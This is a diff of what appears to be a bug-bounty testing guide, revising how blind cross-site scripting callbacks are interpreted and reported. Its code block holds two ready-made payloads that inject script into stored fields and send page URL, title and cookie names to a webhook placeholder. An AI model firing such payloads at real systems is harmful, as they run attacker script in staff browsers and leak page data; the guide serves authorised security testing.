@@ -81,24 +81,24 @@ survives truncation and can be updated after planting.
 The webhook endpoint serves no JavaScript and requires POST, so the
 `script src` form cannot work against it. The payload performs the request
 itself. The fetch variant is the primary fallback transport: it delivers
-both evidence tiers. The image variant is a **connection probe only** - a
-webhook needs POST with a JSON body, which an image request cannot produce,
-so a fire from it proves script execution in a `connect-src`-restricted
-context but delivers no message content. Send the fetch variant whenever
-`connect-src` permits; keep the image variant as the last-resort execution
-proof when it does not (`img-src` governs it). Both forms below are
-self-contained - each defines its own cookie-name variable, so either can
-fire alone under a CSP that blocked the other:
+both evidence tiers. The image variant is a **connection probe only**: a
+webhook needs POST with a JSON body, which an image request cannot produce.
+A probe request may indicate that the inline handler ran, but is not by itself
+the origin/page evidence needed for a reportable fire. Prefer the fetch variant
+when `connect-src` permits; use the image variant as a connection signal when
+only `img-src` permits it. Both forms below are self-contained, so either can
+signal under a CSP that blocked the other:
 
 ```text
 "><script>var c=document.cookie.split(';').map(x=>x.trim().split('=')[0]).filter(Boolean).join(',');fetch('WEBHOOK_URL',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'FIRE <program>-<surface>-<field>-<runid> | '+location.href+' | '+document.title+' | cookies: '+c})})</script>
 "><img src onerror="var c=document.cookie.split(';').map(x=>x.trim().split('=')[0]).filter(Boolean).join(',');new Image().src='WEBHOOK_URL?probe='+encodeURIComponent('FIRE <program>-<surface>-<field>-<runid> | '+location.href)">
 ```
 
-A `probe=` GET from the image variant is a connection/execution signal, not
-a reportable fire on its own; treat it as Tier 1 corroboration that joins to
-the submission record, and re-send the fetch variant on the same surface if
-only the probe fired.
+A `probe=` GET from the image variant is a connection signal, not a
+reportable fire on its own. Join it to the submission record as corroboration;
+retain `Pending-OOB` until a permitted execution-specific observation supplies
+origin/page evidence. Do not automatically resubmit to a staff queue merely
+to convert a probe into a finding.
 
 Both tiers ride in every fallback submission: Tier 1 execution proof
 (token, `location.href`, `document.title`) and Tier 2 extractability
